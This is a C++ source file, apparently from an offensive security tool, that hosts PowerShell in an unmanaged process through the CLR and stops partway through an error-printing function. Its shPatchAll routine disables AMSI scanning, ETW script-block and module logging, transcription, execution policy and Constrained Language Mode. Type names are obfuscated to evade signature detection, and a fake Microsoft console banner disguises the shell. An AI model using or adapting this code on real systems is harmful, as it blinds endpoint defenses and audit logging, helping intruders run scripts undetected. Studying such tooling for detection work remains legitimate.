#include "powershell.h"
#include "common.h"
#include "patch.h"
#include "obfuscate.h"

// Obfuscated type name wrapper functions with static caching
LPCWSTR GetTypeName_PSEtwLogProvider() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation.Tracing.PSEtwLogProvider");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetTypeName_EventProvider() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Diagnostics.Eventing.EventProvider");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetTypeName_PowerShell() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation.PowerShell");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetCmdName_OutString() {
    static WCHAR buffer[64] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("Out-String");
        s.decode(buffer, 64);
    }
    return buffer;
}

void shCreateConsole()
{
    mscorlib::_AppDomain* pAppDomain = NULL;
    RT_CONTEXT cc = { 0 };
    VARIANT vtInitialRunspaceConfiguration = { 0 };
    LPCWSTR pwszBannerText = L"Windows ShellPower\nCopyright (C) Microsoft Corporation. All rights reserved.";
    LPCWSTR pwszHelpText = L"Help message";
    LPCWSTR ppwszArguments[] = { NULL };

    if (!clr::clrInitRuntime(&cc, &pAppDomain))
        goto exit;

    if (!shCreateRunspace(pAppDomain, &vtInitialRunspaceConfiguration))
        goto exit;

    shPatchAll(pAppDomain);

    if (!shStartConsole(pAppDomain, vtInitialRunspaceConfiguration, pwszBannerText, pwszHelpText, ppwszArguments, ARRAYSIZE(ppwszArguments)))
        goto exit;

exit:
    VariantClear(&vtInitialRunspaceConfiguration);
    clr::clrDestroyRuntime(&cc, pAppDomain);
}

BOOL shExecScript(LPWSTR pwszScript)
{
    BOOL bResult = FALSE;
    mscorlib::_AppDomain* pAppDomain = NULL;
    RT_CONTEXT cc = { 0 };
    VARIANT vtPowerShell = { 0 };
    VARIANT vtInvokeResult = { 0 };
    BOOL bHadErrors = FALSE;

    if (!clr::clrInitRuntime(&cc, &pAppDomain))
        goto exit;

    if (!shCreate(pAppDomain, &vtPowerShell))
        goto exit;

    if (!shAddScript(pAppDomain, vtPowerShell, pwszScript))
        goto exit;

    if (!shAddCommand(pAppDomain, vtPowerShell, GetCmdName_OutString()))
        goto exit;

    shPatchAll(pAppDomain);

    if (shInvoke(pAppDomain, vtPowerShell, &vtInvokeResult))
    {
        shPrintResult(pAppDomain, vtInvokeResult);
        shPrintInfo(pAppDomain, vtPowerShell);
    }

    if (!shHadErrors(pAppDomain, vtPowerShell, &bHadErrors))
        goto exit;

    if (bHadErrors)
    {
        shPrintErrors(pAppDomain, vtPowerShell);
        goto exit;
    }

    bResult = TRUE;

exit:
    if (pAppDomain && vtPowerShell.punkVal) shDispose(pAppDomain, vtPowerShell);
    VariantClear(&vtInvokeResult);
    VariantClear(&vtPowerShell);
    clr::clrDestroyRuntime(&cc, pAppDomain);

    return bResult;
}

//
// The following function retrieves an instance of the PSEtwLogProvider class, gets
// the value of its 'etwProvider' member, which is an EventProvider object, and sets
// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
// all PowerShell event logs in the current process. This includes Script Block
// Logging and Module Logging.
// 
// Credit:
//   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
//
BOOL shDisableEtw(mscorlib::_AppDomain* pAppDomain)
{
    BOOL bResult = FALSE;
    HRESULT hr;
    VARIANT vtEmpty = { 0 };
    VARIANT vtPsEtwLogProviderInstance = { 0 };
    VARIANT vtZero = { 0 };
    mscorlib::_Type* pPsEtwLogProviderType = NULL;
    mscorlib::_Type* pEventProviderType = NULL;
    mscorlib::_FieldInfo* pEnabledInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PSEtwLogProvider(), &pPsEtwLogProviderType))
        goto exit;

    if (!clr::clrGetFieldValue(pPsEtwLogProviderType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_NONPUBLIC_STATIC), vtEmpty, L"etwProvider", &vtPsEtwLogProviderInstance))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_CORE, GetTypeName_EventProvider(), &pEventProviderType))
        goto exit;

    if (!clr::clrGetField(pEventProviderType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_NONPUBLIC_INSTANCE), L"m_enabled", &pEnabledInfo))
        goto exit;

    InitVariantFromInt32(0, &vtZero);

    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->SetValue", hr);

    bResult = TRUE;

exit:
    if (pEnabledInfo) pEnabledInfo->Release();
    if (pEventProviderType) pEventProviderType->Release();
    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();

    VariantClear(&vtPsEtwLogProviderInstance);

    return bResult;
}

void shPatchAll(mscorlib::_AppDomain* pAppDomain)
{
    if (!modAmsiOpen())
        PRINT_ERROR("Failed to disable AMSI (1).\n");

    if (!modAmsiScan())
        PRINT_ERROR("Failed to disable AMSI (2).\n");

    if (!shDisableEtw(pAppDomain))
        PRINT_ERROR("Failed to disable ETW Provider.\n");

    if (!modTransFlush(pAppDomain))
        PRINT_ERROR("Failed to disable Transcription.\n");

    if (!modAuthRun(pAppDomain))
        PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");

    if (!modSysPolicyLock(pAppDomain))
        PRINT_ERROR("Failed to disable Constrained Mode Language.\n");

    return;
}

BOOL shCreateRunspace(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration)
{
    BOOL bResult = FALSE;
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pRunspaceConfigurationType = NULL;
    mscorlib::_MethodInfo* pCreateInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.Runspaces.RunspaceConfiguration", &pRunspaceConfigurationType))
        goto exit;

    if (!clr::clrGetMethod(pRunspaceConfigurationType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_STATIC), L"Create", 0, &pCreateInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pCreateInfo, vtEmpty, NULL, &vtResult))
        goto exit;

    memcpy_s(pvtRunspaceConfiguration, sizeof(*pvtRunspaceConfiguration), &vtResult, sizeof(vtResult));
    bResult = TRUE;

exit:
    if (pCreateInfo) pCreateInfo->Release();
    if (pRunspaceConfigurationType) pRunspaceConfigurationType->Release();

    return bResult;
}

BOOL shStartConsole(mscorlib::_AppDomain* pAppDomain, VARIANT vtRunspaceConfiguration, LPCWSTR pwszBanner, LPCWSTR pwszHelp, LPCWSTR* ppwszArguments, DWORD dwArgumentCount)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    VARIANT vtBannerText = { 0 };
    VARIANT vtHelpText = { 0 };
    VARIANT vtArguments = { 0 };
    SAFEARRAY* pStartArguments = NULL;
    mscorlib::_Type* pConsoleShellType = NULL;
    mscorlib::_MethodInfo* pStartMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_MICROSOFT_POWERSHELL_CONSOLEHOST, L"Microsoft.PowerShell.ConsoleShell", &pConsoleShellType))
        goto exit;

    if (!clr::clrGetMethod(pConsoleShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_STATIC), L"Start", 4, &pStartMethodInfo))
        goto exit;

    InitVariantFromString(pwszBanner, &vtBannerText);
    InitVariantFromString(pwszHelp, &vtHelpText);
    InitVariantFromStringArray(ppwszArguments, dwArgumentCount, &vtArguments);

    pStartArguments = SafeArrayCreateVector(VT_VARIANT, 0, 4);

    lArgumentIndex = 0;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtRunspaceConfiguration);
    lArgumentIndex = 1;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtBannerText);
    lArgumentIndex = 2;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtHelpText);
    lArgumentIndex = 3;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtArguments);

    if (!clr::clrInvokeMethod(pStartMethodInfo, vtEmpty, pStartArguments, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pStartArguments) SafeArrayDestroy(pStartArguments);

    if (pStartMethodInfo) pStartMethodInfo->Release();
    if (pConsoleShellType) pConsoleShellType->Release();

    VariantClear(&vtResult);
    VariantClear(&vtBannerText);
    VariantClear(&vtHelpText);
    VariantClear(&vtArguments);

    return bResult;
}

BOOL shCreate(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtEmpty = { 0 };
    VARIANT vtInstance = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pCreateMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_STATIC), L"Create", 0, &pCreateMethodInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pCreateMethodInfo, vtEmpty, NULL, &vtInstance))
        goto exit;

    memcpy_s(pvtPowerShellInstance, sizeof(*pvtPowerShellInstance), &vtInstance, sizeof(vtInstance));
    bResult = TRUE;

exit:
    if (pCreateMethodInfo) pCreateMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

BOOL shDispose(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pDisposeMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Dispose", 0, &pDisposeMethodInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pDisposeMethodInfo, vtPowerShellInstance, NULL, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pDisposeMethodInfo) pDisposeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtResult);

    return bResult;
}

BOOL shAddScript(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPWSTR pwszScript)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    VARIANT vtScript = { 0 };
    VARIANT vtResult = { 0 };
    SAFEARRAY* pAddScriptArguments = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pAddScriptMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"AddScript", 1, &pAddScriptMethodInfo))
        goto exit;

    InitVariantFromString(pwszScript, &vtScript);
    pAddScriptArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

    lArgumentIndex = 0;
    SafeArrayPutElement(pAddScriptArguments, &lArgumentIndex, &vtScript);

    if (!clr::clrInvokeMethod(pAddScriptMethodInfo, vtPowerShellInstance, pAddScriptArguments, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pAddScriptArguments) SafeArrayDestroy(pAddScriptArguments);

    if (pAddScriptMethodInfo) pAddScriptMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtScript);
    VariantClear(&vtResult);

    return bResult;
}

BOOL shAddCommand(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPCWSTR pwszCommand)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    VARIANT vtCommand = { 0 };
    VARIANT vtUseLocalScope = { 0 };
    VARIANT vtResult = { 0 };
    SAFEARRAY* pAddCommandArguments = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pAddCommandMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"AddCommand", 2, &pAddCommandMethodInfo))
        goto exit;

    InitVariantFromString(pwszCommand, &vtCommand);
    InitVariantFromBoolean(FALSE, &vtUseLocalScope);

    pAddCommandArguments = SafeArrayCreateVector(VT_VARIANT, 0, 2);

    lArgumentIndex = 0;
    SafeArrayPutElement(pAddCommandArguments, &lArgumentIndex, &vtCommand);
    lArgumentIndex = 1;
    SafeArrayPutElement(pAddCommandArguments, &lArgumentIndex, &vtUseLocalScope);

    if (!clr::clrInvokeMethod(pAddCommandMethodInfo, vtPowerShellInstance, pAddCommandArguments, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pAddCommandArguments) SafeArrayDestroy(pAddCommandArguments);
    if (pAddCommandMethodInfo) pAddCommandMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtCommand);
    VariantClear(&vtResult);

    return bResult;
}

BOOL shInvoke(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, VARIANT* pvtInvokeResult)
{
    BOOL bResult = FALSE;
    VARIANT vtInvokeResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pInvokeMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Invoke", 0, &pInvokeMethodInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pInvokeMethodInfo, vtPowerShellInstance, NULL, &vtInvokeResult))
        goto exit;

    memcpy_s(pvtInvokeResult, sizeof(*pvtInvokeResult), &vtInvokeResult, sizeof(vtInvokeResult));
    bResult = TRUE;

exit:
    if (pInvokeMethodInfo) pInvokeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

BOOL shStop(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pStopMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;
    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Stop", 0, &pStopMethodInfo))
        goto exit;
    if (!clr::clrInvokeMethod(pStopMethodInfo, vtPowerShellInstance, NULL, &vtResult))
        goto exit;
    bResult = TRUE;

exit:
    if (pStopMethodInfo) pStopMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();
    VariantClear(&vtResult);
    return bResult;
}

BOOL shBeginInvoke(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, VARIANT* pvtAsyncResult)
{
    BOOL bResult = FALSE;
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pBeginInvokeMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;
    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"BeginInvoke", 0, &pBeginInvokeMethodInfo))
        goto exit;
    if (!clr::clrInvokeMethod(pBeginInvokeMethodInfo, vtPowerShellInstance, NULL, &vtResult))
        goto exit;
    memcpy_s(pvtAsyncResult, sizeof(*pvtAsyncResult), &vtResult, sizeof(vtResult));
    bResult = TRUE;

exit:
    if (pBeginInvokeMethodInfo) pBeginInvokeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();
    return bResult;
}

BOOL shAsyncCompleted(mscorlib::_AppDomain* pAppDomain, VARIANT vtAsyncResult, PBOOL pbCompleted)
{
    BOOL bResult = FALSE;
    VARIANT vtCompleted = { 0 };
    mscorlib::_Type* pAsyncResultType = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_RUNTIME, L"System.IAsyncResult", &pAsyncResultType))
        goto exit;
    if (!clr::clrGetPropValue(pAsyncResultType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtAsyncResult, L"IsCompleted", &vtCompleted))
        goto exit;
    if (vtCompleted.vt != VT_BOOL)
        goto exit;
    *pbCompleted = vtCompleted.boolVal == VARIANT_TRUE;
    bResult = TRUE;

exit:
    if (pAsyncResultType) pAsyncResultType->Release();
    VariantClear(&vtCompleted);
    return bResult;
}

BOOL shEndInvoke(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, VARIANT vtAsyncResult, VARIANT* pvtInvokeResult)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex = 0;
    VARIANT vtResult = { 0 };
    SAFEARRAY* pArguments = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pEndInvokeMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;
    if (!clr::clrGetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"EndInvoke", 1, &pEndInvokeMethodInfo))
        goto exit;
    pArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    if (!pArguments || FAILED(SafeArrayPutElement(pArguments, &lArgumentIndex, &vtAsyncResult)))
        goto exit;
    if (!clr::clrInvokeMethod(pEndInvokeMethodInfo, vtPowerShellInstance, pArguments, &vtResult))
        goto exit;
    memcpy_s(pvtInvokeResult, sizeof(*pvtInvokeResult), &vtResult, sizeof(vtResult));
    bResult = TRUE;

exit:
    if (pArguments) SafeArrayDestroy(pArguments);
    if (pEndInvokeMethodInfo) pEndInvokeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();
    return bResult;
}

BOOL shReset(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtCommands = { 0 };
    VARIANT vtStreams = { 0 };
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pPSCommandType = NULL;
    mscorlib::_Type* pPSDataStreamsType = NULL;
    mscorlib::_MethodInfo* pClearMethodInfo = NULL;
    mscorlib::_MethodInfo* pClearStreamsMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;
    if (!clr::clrGetPropValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"Commands", &vtCommands))
        goto exit;
    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSCommand", &pPSCommandType))
        goto exit;
    if (!clr::clrGetMethod(pPSCommandType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Clear", 0, &pClearMethodInfo))
        goto exit;
    if (!clr::clrInvokeMethod(pClearMethodInfo, vtCommands, NULL, &vtResult))
        goto exit;
    VariantClear(&vtResult);
    if (!clr::clrGetPropValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"Streams", &vtStreams))
        goto exit;
    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSDataStreams", &pPSDataStreamsType))
        goto exit;
    if (!clr::clrGetMethod(pPSDataStreamsType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ClearStreams", 0, &pClearStreamsMethodInfo))
        goto exit;
    if (!clr::clrInvokeMethod(pClearStreamsMethodInfo, vtStreams, NULL, &vtResult))
        goto exit;
    bResult = TRUE;

exit:
    if (pClearStreamsMethodInfo) pClearStreamsMethodInfo->Release();
    if (pClearMethodInfo) pClearMethodInfo->Release();
    if (pPSDataStreamsType) pPSDataStreamsType->Release();
    if (pPSCommandType) pPSCommandType->Release();
    if (pPowerShellType) pPowerShellType->Release();
    VariantClear(&vtResult);
    VariantClear(&vtStreams);
    VariantClear(&vtCommands);
    return bResult;
}

BOOL shGetStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPCWSTR pwszStreamName, VARIANT* pvtStream)
{
    BOOL bResult = FALSE;
    VARIANT vtStreams = { 0 };
    VARIANT vtStream = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pPSDataStreamsType = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetPropValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"Streams", &vtStreams))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSDataStreams", &pPSDataStreamsType))
        goto exit;

    if (!clr::clrGetPropValue(pPSDataStreamsType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtStreams, pwszStreamName, &vtStream))
        goto exit;

    memcpy_s(pvtStream, sizeof(*pvtStream), &vtStream, sizeof(vtStream));
    bResult = TRUE;

exit:
    if (pPSDataStreamsType) pPSDataStreamsType->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtStreams);

    return bResult;
}

BOOL shHadErrors(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, PBOOL pbHadErrors)
{
    BOOL bResult = FALSE;
    VARIANT vtHadErrors = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!clr::clrGetPropValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"HadErrors", &vtHadErrors))
        goto exit;

    *pbHadErrors = vtHadErrors.boolVal;
    bResult = TRUE;

exit:
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

void shPrintResult(mscorlib::_AppDomain* pAppDomain, VARIANT vtInvokeResult)
{
    LONG lArgumentIndex;
    VARIANT vtInvokeResultType = { 0 };
    VARIANT vtInvokeResultCountProperty = { 0 };
    VARIANT vtInvokeResultCount = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtItemProperty = { 0 };
    VARIANT vtValue = { 0 };
    VARIANT vtValueAsString = { 0 };
    SAFEARRAY* pIndex = NULL;
    mscorlib::_Type* pPSObjectType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtInvokeResult, &vtInvokeResultType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Count", &vtInvokeResultCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInvokeResultCountProperty, vtInvokeResult, &vtInvokeResultCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Item", &vtItemProperty))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSObject", &pPSObjectType))
        goto exit;

    if (!clr::clrGetMethod(pPSObjectType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (vtInvokeResultCount.lVal > 0)
    {
        wprintf(L"\n");
        wprintf(L"+-----------------------------------+\n");
        wprintf(L"| POWERSHELL STANDARD OUTPUT STREAM |\n");
        wprintf(L"+-----------------------------------+\n");

        for (int i = 0; i < vtInvokeResultCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtItemProperty, vtInvokeResult, pIndex, &vtValue))
            {
                if (clr::clrInvokeMethod(pToStringMethodInfo, vtValue, NULL, &vtValueAsString))
                {
                    wprintf(L"%ws", vtValueAsString.bstrVal);
                    VariantClear(&vtValueAsString);
                }

                VariantClear(&vtValue);
            }

            SafeArrayDestroy(pIndex);
        }
    }

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pPSObjectType) pPSObjectType->Release();

    VariantClear(&vtItemProperty);
    VariantClear(&vtInvokeResultCountProperty);
    VariantClear(&vtInvokeResultType);

    return;
}

void shPrintResultPlain(mscorlib::_AppDomain* pAppDomain, VARIANT vtInvokeResult)
{
    LONG lArgumentIndex;
    VARIANT vtInvokeResultType = { 0 };
    VARIANT vtInvokeResultCountProperty = { 0 };
    VARIANT vtInvokeResultCount = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtItemProperty = { 0 };
    VARIANT vtValue = { 0 };
    VARIANT vtValueAsString = { 0 };
    SAFEARRAY* pIndex = NULL;
    mscorlib::_Type* pPSObjectType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtInvokeResult, &vtInvokeResultType)) goto exit;
    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Count", &vtInvokeResultCountProperty)) goto exit;
    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInvokeResultCountProperty, vtInvokeResult, &vtInvokeResultCount)) goto exit;
    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Item", &vtItemProperty)) goto exit;
    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSObject", &pPSObjectType)) goto exit;
    if (!clr::clrGetMethod(pPSObjectType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo)) goto exit;

    for (int i = 0; i < vtInvokeResultCount.lVal; i++)
    {
        InitVariantFromInt32(i, &vtIndex);
        pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        lArgumentIndex = 0;
        SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);
        if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtItemProperty, vtInvokeResult, pIndex, &vtValue))
        {
            if (clr::clrInvokeMethod(pToStringMethodInfo, vtValue, NULL, &vtValueAsString) && vtValueAsString.vt == VT_BSTR)
                wprintf(L"%ws", vtValueAsString.bstrVal);
            VariantClear(&vtValueAsString);
            VariantClear(&vtValue);
        }
        SafeArrayDestroy(pIndex);
        pIndex = NULL;
    }

exit:
    if (pIndex) SafeArrayDestroy(pIndex);
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pPSObjectType) pPSObjectType->Release();
    VariantClear(&vtItemProperty);
    VariantClear(&vtInvokeResultCountProperty);
    VariantClear(&vtInvokeResultType);
}

void shPrintInfo(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    VARIANT vtInformationStream = { 0 };

    if (!shGetStream(pAppDomain, vtPowerShellInstance, L"Information", &vtInformationStream))
        goto exit;

    if (vtInformationStream.vt != VT_EMPTY)
    {
        PrintPowerShellInformationStream(pAppDomain, vtInformationStream);
    }

exit:
    VariantClear(&vtInformationStream);

    return;
}

void shPrintErrors(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    VARIANT vtErrorStream = { 0 };
    VARIANT vtInvocationStateInfo = { 0 };
    VARIANT vtReason = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pPSDataStreamsType = NULL;
